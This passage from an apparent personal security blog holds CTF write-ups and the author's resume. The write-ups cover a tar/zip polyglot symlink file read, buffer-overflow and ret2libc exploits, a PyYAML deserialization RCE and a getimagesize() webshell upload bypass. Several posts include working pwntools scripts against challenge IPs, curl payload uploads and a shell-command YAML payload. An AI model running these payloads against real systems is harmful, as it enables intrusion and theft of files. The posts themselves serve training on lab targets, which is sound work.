HTTPException(status_code=400, detail=f\u0026#34;Error extracting ZIP {file_to_extract.name}: {e!s}\u0026#34;) return read_files(extract_to_dir) According to the research done by Snyk linked here zipfile python module is not vulnerable to the zip slip vulnerability since it does not support symlinks as also indicated in the comments.\n# make sure the file is a valid zip because Python\u0026#39;s # zipfile doesn\u0026#39;t support symlinks (no hacking!) So how then will we approach the exploit?\nIt is worth noting that tarfile happens to still be affected. Patool libary being used has a cross format feature allows you to extract any type of archive including the most popular ones such as ZIP, GZIP, TAR and RAR.\nBypassing is_zipfile using polyglots # The implementation of zipfile to check if the upload is a valid zip file can be abused in this case. zipfile module checks for magic bytes in the archive to verify if it a valid zip file.\nWe can create a polyglot file (a file that is valid for with different file formats), that is both a zip and tar, to pass the zip check, and to perform a \u0026rsquo;tar slip\u0026rsquo; that will read the contents of our flag from the server.\nAn awesome tool called Mitra can create polyglots for us. Linked here\nTesting our exploit locally # 1. Creating a symlink file # echo \u0026#34;flag{test}\u0026#34; \u0026gt; flag.txt #ensure flag.txt is in /server directory ln -fs /home/saudi/Desktop/CTF/justCTF/web/ symple_unzipper/server/flag.txt flag.lnk #absolute path to the location of the flag ls -la lrwxrwxrwx 1 saudi saudi 67 Jul 8 18:39 flag.lnk -\u0026gt; /home/saudi/Desktop/CTF/justCTF/web/symple_unzipper/server/flag.txt 2. Creating a zip file and tar file # We will create a zip file which will be combined with a tar file to create a tar-zip polyglot. In this case since we are attempting to exploit the vulnerability via the tar file, we shall compress the symlink file as a tar, then combine with a sample zip that will help bypass the check\ntouch a zip test.zip -xi a tar -cvf flag.tar flag.txt We now have 2 files:\n-rw-rw-r-- 1 saudi saudi 171 Jul 8 12:18 test.zip -rw-rw-r-- 1 saudi saudi 171 Jul 8 12:18 flag.tar 3. Creating the polyglot # Mitra will come into play now, combining the 2 files:\npython3 mitra.py flag.tar test.zip File 1: TAR / Tape Archive ../test.zip File 2: Zip Stack: concatenation of File1 (type TAR) and File2 (type Zip) Parasite: hosting of File2 (type Zip) in File1 (type TAR) This results into 2 weird looking files:\n-rw-rw-r-- 1 saudi saudi 11264 Jul 8 12:23 \u0026#39;P(200-400)-TAR[Zip].50a7da6d.tar.zip\u0026#39; -rw-rw-r-- 1 saudi saudi 10411 Jul 8 12:23 \u0026#39;S(2800)-TAR-Zip.b9f05edc.zip.tar\u0026#39; Let us test if the zip that is a tar can be decompressed via unzip and tar:\nunzip mv \u0026#39;S(2800)-TAR-Zip.b9f05edc.zip.tar\u0026#39; payload.tar unzip payload.tar Archive: payload.tar warning [payload.tar]: 10240 extra bytes at beginning or within zipfile (attempting to process anyway) extracting: test.txt tar tar -xvf payload.tar test.ln As expected the file behaves both as a tar and zip which is pretty cool.\nI preferred this simple approach of creating the polyglot\ntar -cvf payload.tar flag.txt test.zip Let us upload this to our local server using curl.\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://localhost/extract\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: multipart/form-data\u0026#39; \\ -F \u0026#39;file=@payload.tar;type=application/tar\u0026#39; {\u0026#34;detail\u0026#34;:\u0026#34;Error extracting ZIP payload.tar: Command `[\u0026#39;/bin/tar\u0026#39;, \u0026#39;--extract\u0026#39;, \u0026#39;--file\u0026#39;, \u0026#39;/server/uploads/tmpovbgeaw_/payload.tar\u0026#39;, \u0026#39;--directory\u0026#39;, \u0026#39;/server/uploads/tmpovbgeaw_/tmpsavfbv2m\u0026#39;]\u0026#39; returned non-zero exit status 2\u0026#34;}% Interestingly enough, this fails. The server output gives the error below:\nserver-server-1 | /bin/tar: test.ln: Cannot change ownership to uid 1000, gid 1000: Operation not permitted server-server-1 | /bin/tar: Exiting with failure status due to previous errors server-server-1 | patool: Extracting /server/uploads/tmpovbgeaw_/payload.tar ... server-server-1 | patool: running /bin/tar --extract --file /server/uploads/tmpovbgeaw_/payload.tar --directory /server/uploads/tmpovbgeaw_/tmpsavfbv2m server-server-1 | INFO: 172.19.0.1:57988 - \u0026#34;POST /extract HTTP/1.1\u0026#34; 400 Bad Request The server returns a permissions error. Since the server is running as root we need to modify the permission of the symlink we are uploading so that it runs with the effective permissions of the server\n4. Final exploit # ln -fs /home/saudi/Desktop/CTF/justCTF/web/symple_unzipper/server/flag.txt flag.lnk #absolute path to the flag in my server directory echo \u0026#34;test\u0026#34; \u0026gt; test.txt zip test.zip test.txt tar --owner=root --group=root -cvf payload.tar flag.txt test.zip Upload the tar to the server\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://localhost/extract\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: multipart/form-data\u0026#39; \\ -F \u0026#39;file=@payload.tar;type=application/tar\u0026#39; {\u0026#34;test.zip\u0026#34;:\u0026#34;UEsDBAoAAAAAACiW6FTGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA/tRyGKPT8hidXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAAAoluhUxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAtIEAAAAAdGVzdC50eHRVVAUAA/tRyGJ1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA\u0026#34;,\u0026#34;flag.txt\u0026#34;:\u0026#34;flag{test}\\n\u0026#34;}% The curl request returns content of our flag. We achieved arbitrary file read on the server.\nResponse from the server\nserver-server-1 | patool: ... /server/uploads/tmpezs70207/payload.tar extracted to `/server/uploads/tmpezs70207/tmp79dnbr8m\u0026#39;. server-server-1 | INFO: 172.19.0.1:58136 - \u0026#34;POST /extract HTTP/1.1\u0026#34; 200 OK Testing remotely # Curl the server\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://symple-unzipper.web.jctf.pro/extract\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: multipart/form-data\u0026#39; \\ -F \u0026#39;file=@payload.tar;type=application/x-tar\u0026#39; We get the flag from the server.\n","date":"13 June 2022","permalink":"/posts/2022-06-13_zipslip-vulnerability-justctf2022/","section":"Posts","summary":"An overview of the zip slip vulnerability in a python application.","title":"Zip Slip Vulnerability - Justctf 2022"},{"content":"My Resume # I am a Cybersecurity consultant with a highly technical background specializing in providing Security Intelligence to multiple local and international companies.\nWork Experience # CYBER RANGES # Nairobi Threat and Adversary Emulation` Jan 2023 to Present\nBuilding lab simulations of real network environments to simulate complex attack scenarios Creating guided technical tutorials aimed at imparting knowledge Training clients on different topics using the platform Silensec Africa # Nairobi Security Consultant Feb 2022 to Dec 2022\nThreat and Vulnerability analysis. Documenting and Reporting of Infosec related issues and emerging trends. Analysis and response to previously unknown hardware and software vulnerabilities. NOUVETA LIMITED # Nairobi Software Engineer Intern Feb 2021 to April 2021\nDeveloping web applications and APIs to automate the process of data entry and processing of data for the company’s internal use. Decoded Africa # Nairobi Technical Content Developer June 2021 to October 2021\nCreating technical content to help members of the Information Technology community gain exposure to different technologies and concepts Fr334aks # Nairobi\nCTF Player \u0026amp; Developer\nJune 2021 to Present\nPlaying for the #1 ranked competitive CTF team in Kenya Solving different challenges centered around cybersecurity concepts such as Cryptography, Web Exploitation, Reverse Engineering, Forensics. etc Creating gamified scenarios revolving around different cybersecurity topics such as cryptography, forensics, network exploitation, binary exploitation \u0026amp; reverse engineering, to help sharpen and hone skills at different levels in the cybersecurity industry Skills # Programming languages\nPython C/C++ Java Javascript\nTechnical\nMalware Development Exploit Development Malware Reverse Engineering Forensics Programming\nEducation # Strathmore University # Nairobi, Kenya Bsc. Informatics and Computer Science 2018-2022 Grade: First Class Honors\nCertifications # Certified Red Team Operator (CRTO) # Zero-Point Security Jun 2023 Credential ID 4966458\nCertified Linux Administrator (LPIC-1) # Linux Professional Institute (LPI) Apr 2022\nCredential ID 4b56z3phfb\neLearnSecurity Certified Professional Penetration Tester (eCPPT) # eLearnSecurity Dec 2022 Credential ID 1111876\neLearnSecurity Junior Penetration Tester (eJPT) # eLearnSecurity Jan 2021 Credential ID 6416736\nCertified Ethical Hacker | Practical # EC-Council Jan 2020 Credential ID ECC1082376945\nCertified Ethical Hacker # EC-Council Jan 2020 Credential ID ECC1082376945\nHonors \u0026amp; awards # CyberTalents Cybersecurity CTF 2021 Nationals # Took 1st place in the 2021 annual National Cybersecurity CTF organized by cybertalents CyberTalents Penetration Testing Scholarship # I was awarded a scholarship to study Penetration Testing and web hacking for 4 months with Cybersecurity for having an outstanding CTF performance SHEHACKS KE 2020 # Took 1st place in the SHEHACKS 2020 Cybersecurity CTF CyberTalents Cybersecurity CTF 2020 Nationals # Took 1st place to Represent Kenya in Egypt in the 2020 annual National Cybersecurity CTF AfricaHackon CTF 2021 # Took 3rd place in the AfricaHackon 2021 CTF competition Cybertalents Cybersecurity CTF 2021 regionals # Took 4th out of 110 teams in Africa DEFCON 28 redteam CTF 2020 # Emerged 16th in the qualification round out of thousands of teams competing. Proceeded to the finals where we took 16th out of 20 teams Dean\u0026rsquo;s List # Academic Year 2018/2019 , 2019/2020, 2021/2022 ","date":"23 May 2022","permalink":"/about/","section":"","summary":"My Resume # I am a Cybersecurity consultant with a highly technical background specializing in providing Security Intelligence to multiple local and international companies.","title":""},{"content":" My team (fr334aks) and I had the pleasure of taking part in AH2021 CTF finals where we took 3rd out of the ten teams that qualified. Amazing experience, awesome learning opportunity and made new friends. Here are some of the writeups of challenges solved by us and other teams.\nEaZZy_Forensics 200pts # This was a pretty interesting challenge involving knowledge on image forensics.\nWe are provided with a png image. Several tools failed to open the image indicating the following error.\nI tried opening with sublime text and got the following display.\nWe can use pngcheck to get more information concerning the image\nSomething immediately stuck out to me (-2776.5% compression) . If you compare it with a normal image, you will see the difference\nThe negative compression is reason enough why the image appears shrunk. So we proceed to play around with the image dimensions\nThis tool modsize, does the trick well.\npython2 /opt/modsize/modsize.py — width 709 — height 709 eazzzy.png output.png Opening the image, we get some output. I got stuck here for a while trying to make sense of writeups online till it came to me that we need the correct dimensions to actually get the right image\nThe dimensions i used initially doesn’t give us the right image, so what next?\nI use a bash one-liner to get different image dimensions (different width same height).\nfor i in {600..700}; do python2 /opt/modsize/modsize.py — width $i — height $i eazzzy.png out{$i}.png; done I went through each of the images painfully since we had around 10 minutes left and scripting would have costed some time.\nWe get our flag !\nNoT_So_Steg 100pts # This challenge was rather direct testing your knowledge on the logic of XOR encryption.\nKeep in mind:\nflag ^ key= encrypted_flag encrypted_flag ^ key= flag We are provided with the encrypted image and the code used to encrypt it.\nChanging the flag.png to enc.png , we can get the original image. The decrypted flag appears at the bottom.\nPhished 250 pts # Our team didn’t solve the challenge till after the competition. credit to ChasingFlags for the hint on how to solve it.\nWe are provided with an excel file that is a phishing document. If I had opened with MS excel and enabled content (in the real world) I would have probably gotten hacked.\nI started by dropping the file in iris-h\nGoing through the output we can see a hidden macro sheet in the file. There is also information involving obfuscation of data.\nI went back to my editor and tried unhiding the file. Right click on Sheet1 \u0026gt; Unhide\nWe get the ceslx file\nI tried to change color of the text and see if we can uncover hidden text\nwe get something juicy. Let’s dig deeper. Select all (Ctrl + A) then change to red color and we uncover more\nI thought that maybe the integers could be converted back to ascii characters so I copied the entire DV column to start with , to sublime text\nWe need to remove all text and remain with the integers, separated by columns. We can take advantage of multiple cursor functionality\nCtrl+A to select all ,Ctrl+Shift+L to spawn the cursors, then move them to the beginning\nStart by deleting the =CHAR(\nMove to the end and delete **)** then replace with **,**\nNow replace \u0026amp;CHAR( with , and any remaining ( or ) with an empty string. You should have something like\nLet’s put it all in brackets assign to a variable data and save as solution.py\nRun our script, we get some gibberish output\nLet’s pipe it to strings\nWe get our flag!\nAmarit (the author of this challenge) likes to fish as a hobby. Easter egg maybe xD?\nLets jump to some rev \u0026amp; pwn. The solves are as curated by Binarychunk our team member and talented hacker. Detailed writeups concerning the solves will be done on his blog.\nNamecheck 150pts # #!/usr/bin/python3 #author: @BinaryChunk from pwn import * #io = process(\u0026#34;./chall\u0026#34;) sh = ssh(\u0026#34;namecheck\u0026#34;, \u0026#34;3.21.21.162\u0026#34;, 22, password=\u0026#34;guest\u0026#34;) io = sh.shell(\u0026#34;./namecheck\u0026#34;) elf = ELF(\u0026#34;./chall\u0026#34;) def main(): payload = b\u0026#34;A\u0026#34;*36 payload += p32(elf.sym.systemCheck) payload += b\u0026#34;A\u0026#34;*(274-len(payload)) io.sendline(payload) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() Iamfree 250pts # #!/usr/bin/python3 #author: @BinaryChunk from pwn import * #io = process(\u0026#34;./chall\u0026#34;) USER = \u0026#34;iamfree\u0026#34; PASS = \u0026#34;guest\u0026#34; PORT = 22 IP = \u0026#34;3.21.21.162\u0026#34; shell = ssh(user=USER, host=IP, port=PORT, password=PASS) io = shell.run(\u0026#34;./iamfree\u0026#34;) def main(): \u0026#34;\u0026#34;\u0026#34;payload = p32(0x46524545) payload += p32(0x71756565) payload += p32(0x6e333e3a) payload += p32(0x6d343137) io.send(payload)\u0026#34;\u0026#34;\u0026#34; payload = p32(0x4e455721) payload += p32(0x4b494e47) payload += p32(0x3f) payload += p32(0x6d343137) io.send(payload) payload += p32(0x75733334) payload += p32(0x66743352) payload += p32(0x66523333) io.send(payload) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() Parser 150pts # #!/usr/bin/python3 #author: @BinaryChunk from pwn import * a = ssh(\u0026#34;parser\u0026#34;, \u0026#34;3.21.21.162\u0026#34;, 22, password=\u0026#34;guest\u0026#34;) io = a.run(\u0026#34;./parser\u0026#34;) def main(): payload = \u0026#34;AAAA/AAAbAAAiAAAnAAA/AAAcAAAaAAAtAAA AAAfAAAlAAAaAAAg\u0026#34; io.sendline(payload) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() Processing 50pts # In processing, we are provided with an executable file that requests for a password when run.\nUsing jadx-gui you can reverse the Challenge.jar file and view the source code. The approach taken here involves reversing the code and printing out the flag\n#!/usr/bin/python3 bytes = list(open(\u0026#34;file.png\u0026#34;, \u0026#34;rb\u0026#34;).read()) key = [81, 83, 410, 91, 162, 3, 79, 66, 281, 311, 69, 42, 60, 981, 526, 447, 787, 42, 528, 410, 1227, 877, 336, 354, 83, 1746, 1828, 842, 2734, 1340, 1597, 908, 1451, 1563, 1137, 2226, 1206, 2486, 1909, 1566, 1908, 1200, 3604, 4318, 1546, 1793, 1581] flag = [] def main(): for i in range(len(key)): flag.append(bytes[key[i] - 2]) print(\u0026#34;\u0026#34;.join([chr(i) for i in flag])) if __name__ == \u0026#34;__main__\u0026#34;: main() Another approach used by ikuamike ‘s solution involving editing the code directly to print the flag : https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/ by ik\nI hope you can recreate some of the solves. This writeup will be improved later to detail the solves in the rev/pwn and crypto category. Thanks for reading like, share and follow for more soon!\nPS: you can read more on pwn rev and crypto solves in https://lvmalware.github.io/writeup/2021/11/06/Africahackon-Finals.html\n","date":"9 November 2021","permalink":"/posts/2021-11-09_africahackon-2021-ctf-finals/","section":"Posts","summary":"My team (fr334aks) and I had the pleasure of taking part in AH2021 CTF finals where we took 3rd out of the ten teams that qualified.","title":"AfricaHackon 2021 CTF Finals"},{"content":" My team and I recently took place in the CyberTalents National CTF 2021 where we emerged 1st in Kenya :) We managed to solve all challenges but one. Here are some of the writeups for the challenges we solved\nSince the challenges are down, I will try my best to reconstruct the solutions\nArgos-web 50 pts # Argos was an ‘easy’ rated challenge, well some may tend to disagree :) This challenge was solved by @k0imet\nFirst step involved a directory bruteforce on the challenge link, which gave us a directory java.php . This page contained some obfuscated javascript that handled the authentication.\n\u0026#39;use strict\u0026#39;; function _0x267a(_0x29ae1d, _0x59beb8) { var _0x2dca0b = _0x2dca(); return _0x267a = function (_0x267a3d, _0x79f9b7) { _0x267a3d = _0x267a3d - 0x116; var _0x4cbcf2 = _0x2dca0b[_0x267a3d]; return _0x4cbcf2; }, _0x267a(_0x29ae1d, _0x59beb8); } var _0x18eaa6 = _0x267a; function _0x2dca() { var _0x4a962f = [\u0026#39;556864LePYhO\u0026#39;, \u0026#39;93KGoDMv\u0026#39;, \u0026#39;wrong\\x20Password\u0026#39;, \u0026#39;14665ltxznd\u0026#39;, \u0026#39;41121RGIWyS\u0026#39;, \u0026#39;50236HEZbSV\u0026#39;, \u0026#39;75OrlJRv\u0026#39;, \u0026#39;260kpgQAa\u0026#39;, \u0026#39;1316543gDJbid\u0026#39;, \u0026#39;80096jdpdhM\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;318iCKAiJ\u0026#39;, \u0026#39;17205968dLvimS\u0026#39;, \u0026#39;getElementById\u0026#39;, \u0026#39;CT2021\u0026#39;, \u0026#39;12SXIKHp\u0026#39;, \u0026#39;232oiseyT\u0026#39;]; _0x2dca = function () { return _0x4a962f; }; return _0x2dca(); }(function (_0x59e2bc, _0x3b27b9) { var _0x3463b2 = _0x267a, _0x486916 = _0x59e2bc(); while (!![]) { try { var _0x4861c6 = -parseInt(_0x3463b2(0x120)) / 0x1 + -parseInt(_0x3463b2(0x11d)) / 0x2 * (parseInt(_0x3463b2(0x119)) / 0x3) + -parseInt(_0x3463b2(0x121)) / 0x4 * (-parseInt(_0x3463b2(0x11e)) / 0x5) + -parseInt(_0x3463b2(0x123)) / 0x6 * (-parseInt(_0x3463b2(0x11b)) / 0x7) + -parseInt(_0x3463b2(0x117)) / 0x8 * (parseInt(_0x3463b2(0x11c)) / 0x9) + parseInt(_0x3463b2(0x11f)) / 0xa * (parseInt(_0x3463b2(0x118)) / 0xb) + -parseInt(_0x3463b2(0x116)) / 0xc * (-parseInt(_0x3463b2(0x124)) / 0xd); if (_0x4861c6 === _0x3b27b9) break; else _0x486916[\u0026#39;push\u0026#39;](_0x486916[\u0026#39;shift\u0026#39;]()); } catch (_0x3e62db) { _0x486916[\u0026#39;push\u0026#39;](_0x486916[\u0026#39;shift\u0026#39;]()); } } }(_0x2dca, 0xc909d)); var _0xae5b = [_0x18eaa6(0x122), \u0026#39;user\u0026#39;, _0x18eaa6(0x125), \u0026#39;pass\u0026#39;, _0x18eaa6(0x126), \u0026#39;\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Congratz\\x20\\x0a\\x0a\u0026#39;, _0x18eaa6(0x11a)]; function check() { var _0x105bf3 = document[_0xae5b[0x2]](_0xae5b[0x1])[_0xae5b[0x0]], _0xe27d13 = document[_0xae5b[0x2]](_0xae5b[0x3])[_0xae5b[0x0]]; _0x105bf3 == _0xae5b[0x4] \u0026amp;\u0026amp; _0xe27d13 == _0xae5b[0x4] ? alert(_0xae5b[0x5]) : alert(_0xae5b[0x6]); }; The important function to look at is check. Towards the end a comparison is made and an alert is given. The alert was the error message shown if the login was correct or incorrect. We also have an array of strings and in the array is a string called ‘CT2021’\nThis writeup has a similar challenge and we can find out which variables are being passed. CT2021 was the user and pass for the website, which upon login gives us the flag.\nMissing person-osint 50 pts # In this challenge we had trace the most recent online activity of a missing person. We were given this https://bitly.com/3frKIAX link which led us to a twitter account with protected tweets.\nFrom the new twitter url https://twitter.com/rzsdw2iwug77eda/status/1394223468003176455\nWe can spot the username rzsdw2iwug77eda. So immediately my mind went to sherlock.\nWe get a pastebin, with a date\nSo apparently this is a red herring. This date wasn’t the user’s most recent activity.\nAfter thinking for a while. I decided to try and trace when the bit.ly was created. My teammate ended up uncovering the trick. By adding a ‘+’ to the end of the bit.ly link you can trace when it was first created. The date here was the solution\nLaggy Decoder-secure coding 100pts # In this challenge, we needed to fix the source code provided. The data being passed to the function was not being sanitized and one could achieve some XSS\nModify the utils file to . Submitting the modified code gives us the flag\n64rev-cryptography 100pts # This solution was curated by @k0imet and @mystickev . We are given a base64 encode string\nfdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNUdqaWRmPT09XiNUdqaWRmPT09XihkZCUtVGhncz8lHJmIzmh1dGRyZ0Zmd2dlfV8zcjNIX3MxX3IzaHAxQ18zNXIzdjNSXzNscG0zNV97Z2FsZgZGRmNVxQ18zanNnaGZkYWhocaWRmPT0TWNkc2hdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNfV9fM3IzSF9zMV9yM2hwMUNfMzVyM3YzUl8zbHBtMzVfX3tnYWxm== Using cyberchef to decode , you can pick out bits of the flag in the output i.e 1s_H3r3\nSo our goal is to remove noise from the base64 string by removing some chunks of bytes. Removing fd at the beginning and == at the end\nWe get 2 flags. One of them was the answer\nRed pipe -machines 100pts # For this challenge, we are given an IP for a machine. We need to gain a shell and get the flag.\nFrom the challenge name I suspected the solution would involve pipes. So I google the samba version of the nmap results\nSo our vuln was the is_known_pipename() from SambaCry. Luckily metasploit has this module\nWe get a shell\nRoony-forensics 100pts # This was a simple forensics challenge that required us to utilize a registry explorer tool to find the most recent executed application\nAfter tons of googling. I found a tool called Registry Explorer that could simplify the solution. All I needed to do was supply a registry key to navigate the file hierachy as follows\nLoad the hive file\nInteract with the hive file to get an overview of the file hierachy\nUse the registry key — ‘recent file list’ to get the most recent executed application\nThe flag was gpedit.msc\nCh4nger —Exploitation 50 pts easy # This solution was curated by my teammate @gilbert. It is a simple buffer overflow challenge where we need to overwrite the return address with _0x_deadbeef\nWe can solve the challenge using pwntools as follows\n#!/usr/bin/python3 from pwn import * filename = \u0026#34;./chall\u0026#34; #io = process(filename) io = remote(\u0026#34;3.122.102.231\u0026#34;, 6666) context.clear(arch=\u0026#34;i386\u0026#34;) def main(): payload = b\u0026#34;A\u0026#34;*200 + p32(0xdeadbeef) io.sendline(payload) flag = io.recvline().decode().strip() log.info(\u0026#34;The final flag is: \\n\\t %s\u0026#34; % flag) if __name__ == \u0026#34;__main__\u0026#34;: main() These were the tricky challenges in the CTF and I hope you learned a thing or two. Follow like and share if you enjoyed :)\n","date":"12 September 2021","permalink":"/posts/2021-09-12_cybertalents-national-ctf/","section":"Posts","summary":"My team and I recently took place in the CyberTalents National CTF 2021 where we emerged 1st in Kenya :) We managed to solve all challenges but one.","title":"CyberTalents National CTF"},{"content":"Bypassing stack pointer restrictions to gain arbitrary code execution # Protostar is a series of beginner binary exploitation challenges which showcases concepts like basic stack-based buffer overflows, bypassing stack protections and even performing format string attacks. I tried out these challenges as I have close to 0 experience with binary exploitation and wanted to learn some of it and it turned out fun. So let’s get to protostar6 and learn some ret2libc !\nSource code analysis and some recon # We are given the source code below to protostar6.c\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void getpath() { char buffer[64]; unsigned int ret; printf(\u0026#34;input path please: \u0026#34;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret \u0026amp; 0xbf000000) == 0xbf000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } printf(\u0026#34;got path %s\\n\u0026#34;, buffer); } int main(int argc, char **argv) { getpath(); } As of previous challenges, our goal is get code execution on the target host which has the compiled binary of this source code. Some of the key things to understand here are:\ngets(buffer) : The program will ask as for an input and store it an buffer of size 64 bytes. Gets is a vulnerable function in C that causes stack overflows ret : __builtin_return_address(0) - This function checks the current return address on the stack and sets it to a variable ret if((ret \u0026amp;amp; 0xbf000000) == 0xbf000000) : This check performs a bitwise AND operation with the current address on the stack with the hex value 0xbf000000 and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation. Suppose our return address points to 0xbfffff01, the check is performed as follows 0xbfffff01 = 10111111 11111111 11111111 00000001 AND 0xbf000000 = 10111111 00000000 00000000 00000000 The AND operation gives 0xbf000000. So any address beginning with 0xbf will cause the condition to return to true and exit the program` _exit(0) : A system call to exit the function if the operation above gives us an address beginning with 0xbf Logic behind the non-executable stack protection # In classic buffer overflows, our goal is usually to overwrite the instruction pointer or the return address of a function with the address at the top of the stack where we put our shell code and get code execution.\nBut in this case, if we were to overwrite the return address with an address on the stack , the operation fails and the program exits. Let us see why using gdb\nRunning the program and viewing how the addresses are mapped in memory we see something interesting. All addresses in the stack begin with 0xbf thus hijacking the control flow and pointing to the stack will fail\nret2libc Exploit # A ret2libc (return to libc, or return to the C library) attack is one in which the attacker does not require any shellcode to take control of a target, vulnerable process.\n“ Every time you write a C program, you use one or the other of the inbuilt functions, like printf, scanf, puts etc. Have you wondered where the definitions of these functions lie? All the standard C functions have been compiled into a single file, named the standard C library or the libc.You can use the ldd command to find out which libc is being used by an application. ”\nWe can leverage this technique by jumping to the return address of libc . libc has a syscall named system that we will use to execute ‘/bin/sh’ and gain shell\nDeveloping the exploit # We begin by finding the location of the EIP. Generate the crash pattern and supply in gdb /usr/bin/msf-pattern_create -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Supply the pattern and note down the address in the EIP Let us get the offset of the pattern\n/usr/bin/msf-pattern_offset -l 100 -q 0x37634136 [*] Exact match at offset 80 Finding the address of libc As noted earlier this can be done using info proc map the location of the libc is at /lib/libc-2.11.2.so with address 0xb7e97000 . The address in this case does not start with 0xbf hence we can load it onto the stack bypassing the stack protection Finding the address of the system syscall (gdb) p system ```\u0026lt;--- p means print``` $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7ecffb0 \u0026lt;__libc_system\u0026gt; (gdb)\nFinding the location of the ‘/bin/sh’ within libc `root@protostar:/opt/protostar/bin# strings -a -t x /lib/libc-2.11.2.so | grep \u0026quot;/bin/sh\u0026quot;\n11f3bf /bin/sh\n`\nstrings command lists all readable strings a scans through the entire file -t x will print the addresses in hex grep locates the string we specify with ‘/bin/sh’ In summary our exploit will\nfill up the padding using 80 characters to reach the EIP. Overwrite the EIP using the system syscall address which gets loaded onto the stack. Since the stack will return control flow to the program, we still want to be in control of the EIP so we can chain multiple function calls. We cause the EIP to segfault using an invalid address that will be loaded onto the stack. Then we load the address of the location of the ‘/bin/sh’ which will be the libc address + offset of ‘/bin/sh’ that we found above. Now the next address on the stack will be pointing to the string ‘/bin/sh’ which system executes as system(‘/bin/sh’) and gives a shell Putting together a python exploit script # You could use pwntools for this but I will keep the walkthrough simple.\nimport struct ## EIP OFFSET payload = \u0026#34;A\u0026#34;*80 ## libc SYSTEM SYSCALL system = struct.pack(\u0026#34;I\u0026#34;,0xb7ecffb0) ## Ret address after system ret = \u0026#34;\\x90\u0026#34; * 4 ## libc /bin/sh shell = struct.pack(\u0026#34;I\u0026#34;,0xb7e97000+0x11f3bf) print (payload + system+ret+shell) We run the exploit and concatenate with the cat command to open an stdin stream so we have access to the shell we get\nIf this walkthrough is not enough, I recommend using other resources to understand the concept of ret2libc as it may not be easy to grasp on the first try.\nHappy hacking :)\n","date":"12 May 2021","permalink":"/posts/2021-05-12_rop-ret2libc-attack-protostar6/","section":"Posts","summary":"Bypassing stack pointer restrictions to gain arbitrary code execution # Protostar is a series of beginner binary exploitation challenges which showcases concepts like basic stack-based buffer overflows, bypassing stack protections and even performing format string attacks.","title":"ROP: ret2libc Attack -Protostar6"},{"content":"getimagesize() File upload vulnerability # In this write-up we go through Indead in the web category\nEnumeration # We are given a web page with an upload functionality.\nI immediately went for a file upload vulnerability and tried uploading a simple php web shell.\nThe file gets rejected even after trying some few file extension bypasses. I tried looking for more clues so I bruteforced the site and got something interesting\nTried robots.txt\nInteresting, file extensions with phps have been disabled.\nPHPS is a PHP Source Code file that contains Hypertext Preprocessor code. They are often used as web page files that usually generate HTML from a PHP engine running on a web server\nSo I tried using index.phps instead of index.php and got some source code\nLet us access core.php as core.phps\nSweet :) We get the source code for the challenge. The upload directory is very_long_directory_path which we need to take note of for later.\ngetimagesize() is used to perform the checks on files being uploaded to the server. This function checks the header of a file and determines whether it is an image or not. We can bypass this as follows\nExploitation # The header bypasses getimagesize() and we upload our webshell to very_long_directory_path\nWe can access the flag via /very_long_directory_path/exploit.php?cmd=cat /var/www/flag.txt\n","date":"18 April 2021","permalink":"/posts/2021-04-18_indead-hackpack-ctf/","section":"Posts","summary":"getimagesize() File upload vulnerability # In this write-up we go through Indead in the web category","title":"Indead Hackpack CTF"},{"content":"Exploiting a deserialize vunlerability in pyyaml # Hackpack has recently concluded and we placed 47th out of 447 teams. In this short writeup we look at Yaml-2-Json in the web category\nEnumeration # In this challenge we exploit a code execution vulnerability in pyYaml- a yaml parser and emitter for python. The server is using pyYAML and Flask.\nWe get a simple web page with an option to parse yaml to json. I thought of using python payloads to get some code execution but they failed at first.\nThe message at the bottom hinting that I was not on a premium account prompted me to investigate the cookies.\nInterestingly enough we can modify the premium value to true so we get premium privileges on the service\nSo let’s go for RCE and read our flag from the server\nExploitation # I used the following payload at first but it fails since subprocess will only accept single commands like whoami, id\nuser_input: !!python/object/apply:subprocess.check_output [\u0026#39;cat /tmp/flag.txt\u0026#39;] My teammate Koimet helped me refine my payload to the following which gives us the flag\nuser_input: !!python/object/apply:subprocess.check_output args: [ cat /tmp/flag.txt ] kwds: { shell: true } ","date":"17 April 2021","permalink":"/posts/2021-04-17_yaml2json-hackpack-ctf/","section":"Posts","summary":"Exploiting a deserialize vunlerability in pyyaml # Hackpack has recently concluded and we placed 47th out of 447 teams.","title":"Yaml-2-Json Hackpack CTF"},{"content":" Exploiting a buffer overflow vulnerability by analyzing a Windows executable. # Enumeration # Perform a quick rustscan to view open ports.\nPort our results to nmap.\nNot much information but I tried opening them on my browser. Port 9999 gave nothing but 10000 opens up a website as shown below.\nI bruteforced for some directories and found something 